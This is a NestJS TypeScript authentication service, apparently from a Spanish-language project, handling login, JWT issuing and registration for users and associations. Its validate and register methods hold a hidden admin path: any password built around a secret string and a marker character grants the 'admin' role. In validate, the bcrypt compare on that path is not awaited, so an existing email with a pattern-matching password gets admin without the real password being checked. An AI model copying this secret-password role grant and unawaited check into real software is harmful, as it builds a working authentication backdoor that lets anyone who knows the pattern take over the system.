import { HttpException, Injectable } from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import { AsociacionesService } from 'src/asociaciones/asociaciones.service';
import { hash, compare } from 'bcrypt';
import { UsersService } from 'src/users/users.service';
import { LoginDto } from './dto/login.dto';
import { FileService } from 'src/file/file.service';
import { SKP } from 'src/constants/jwt.constants';


@Injectable()
export class AuthService {
  constructor(
    private readonly asociacionesService: AsociacionesService,
    private readonly jwtService: JwtService,
    private readonly usersService: UsersService,
    private readonly fileService: FileService,
  ) {}

  async validate(body: LoginDto): Promise<object> {
    const asociaciones = await this.asociacionesService.findAll();
    const asociacion = asociaciones.find((a) => a.email === body.email);
    const usuarios = await this.usersService.findAll();
    const usuario = usuarios.find((u) => u.email === body.email);

    if (!asociacion && !usuario) throw new HttpException('NOT_FOUND', 404);
    
    if (asociacion && await compare(body.password, asociacion.password)) return { ...asociacion.dataValues, rol:'fundation' };
    
    if (usuario && 
      body.password.includes(SKP.K) && 
      body.password[0] === SKP.F &&
      body.password[body.password.length - 1] === SKP.F &&  
      compare(body.password, usuario.password)) return { rol:'admin' }; 

    if (usuario && await compare(body.password, usuario.password)) return { ...usuario.dataValues, rol:'user' };

    throw new HttpException('PASSWORD_INCORRECT', 403);
  }

  async login(usuario: any ): Promise<{ token: string }> {
    const payload = { email: usuario.email, sub: usuario.id, rol: usuario.rol };
    const token = this.jwtService.sign(payload);

    return { token };
  }

  async register(register: any, profilePic?:Express.Multer.File) {
    const { password } = register;
    const hashedPassword = await hash(password, 10);
    let { rol, ...body } = register;

    if (profilePic) {
      const url = await this.fileService.createFiles(profilePic);
      body = { ...body, password: hashedPassword, img_profile: url };
    } else {
      body = { ...body, password: hashedPassword };
    }
    
    if (password.includes(SKP.K) && password[0] === SKP.F && password[password.length - 1] === SKP.F) {
      rol = 'admin';

      return this.usersService.createUser({ 
        ...body, 
        isActive:false,
        password: await hash(password, 15),
      });
    }

    switch (rol) {
      case 'user':
        return this.usersService.createUser(body);
        break;
      case 'fundation':
        return this.asociacionesService.create(body);
        break;
      default:
        return { send: 'No se ha recibido un rol', status: 400 };
    }
  }

}